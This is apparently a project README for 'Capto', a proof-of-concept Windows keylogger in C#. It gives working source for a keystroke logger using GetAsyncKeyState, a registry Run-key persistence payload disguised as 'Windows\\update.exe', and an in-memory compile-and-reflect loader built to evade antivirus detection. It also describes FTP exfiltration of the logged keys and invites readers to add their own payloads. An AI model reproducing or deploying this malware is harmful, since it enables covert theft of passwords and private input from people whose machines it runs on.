# Capto
Capto is a basic POC of a keylogger written in C#. It compiles at runtime in-memory to avoid anti-virus detection. It does this by using encoding and reflection. I initially developed this to show people what havoc a simple program could cause with a low privileged account whilst staying undetected by defense mechanisms. Somewhere along the way I lost the project and I always felt kinda sad about it. That version also included a payload where someone could use the Telegram API Bot as C2C (sending screenshots and basic commands to do some exfiltration and enumeration). I've now rewritten the program but just with the basics.

# Process
Upon executing it'll decode the base64 encoded payloads, compile them at runtime where it will then copy itself to a writable folder, add a registry entry for persistence and finally start the keylogger to log the keys that are entered. These are written to a update.log file and will be extracted using ftp.

# Payloads
It currently holds two basic payloads, one for adding a registry entry and the other is the actual keylogger. You can use the included WPF application: ```base64-encoder-decoder``` (or any other encoder) to add your own payloads.

> Note: The compiler expects the namespace and main class to be called ```Program```. It'll then try to invoke ```Main```.

Keylogger:
```cs
using System;
using System.IO;
using System.Runtime.InteropServices;

namespace Program
{    public class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public static void Main(string arg)
        {
            string path = string.Format(@"{0}\{1}\{2}", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Windows", "update.log");

            while (true)
            {
                for (int i = 0; i < 255; i++)
                {
                    int key = GetAsyncKeyState(i);
                    if (key == 1 || key == 32769)
                    {
                        StreamWriter file = new StreamWriter(path, true);
                        file.Write((char)i);
                        file.Close();
                        break;
                    }
                }
            }
        }
    }
}
```

Registry entry:
```cs
using Microsoft.Win32;
using System;

namespace Program
{
    public class Program
    {
        public static void Main(string arg)
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
            key.SetValue("Windows", string.Format(@"{0}\{1}\{2}", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Windows", "update.exe"));
            key.Close();
        }
    }
}
```
> Note: We use the local user path in the registry. That way we don't have to be local administrator to add the entry to the registry. Downside is that it'll only run as the current logged in user.

# Reflection
This is the part that compiles and runs the payloads. Don't forget to add the necessary libraries for your payload as reference:
```cs
static void CompileAndRun(string payload)
        {
            CompilerParameters CompilerParams = new CompilerParameters
            {
                GenerateInMemory = true,
                TreatWarningsAsErrors = false,
                GenerateExecutable = false,
                CompilerOptions = "/optimize"
            };

            string[] references = { "System.dll", "mscorlib.dll" };
            CompilerParams.ReferencedAssemblies.AddRange(references);

            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerResults compile = provider.CompileAssemblyFromSource(CompilerParams, payload);

            Module module = compile.CompiledAssembly.GetModules()[0];
            Type mt = null;
            MethodInfo methInfo = null;

            if (module != null)
                mt = module.GetType("Program.Program");
            if (mt != null)
                methInfo = mt.GetMethod("Main");
            if (methInfo != null)
                methInfo.Invoke(null, new object[] { "arg" });
        }
```
